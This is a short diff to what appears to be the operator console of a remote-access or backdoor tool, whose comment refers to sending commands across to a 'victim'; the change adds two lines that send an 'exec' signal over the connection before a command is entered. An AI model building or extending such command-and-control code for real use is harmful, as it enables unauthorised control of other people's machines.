@@ -79,6 +79,8 @@ def console(conn, addr):
 		comminput = input("> ")
 
 		if comminput == "exec":
+			comminput = comminput.encode('utf-8')
+			conn.send(comminput)
 			execinput = input("[*] Enter command to execute: ")
 
 			# preps input for sending across to victim.
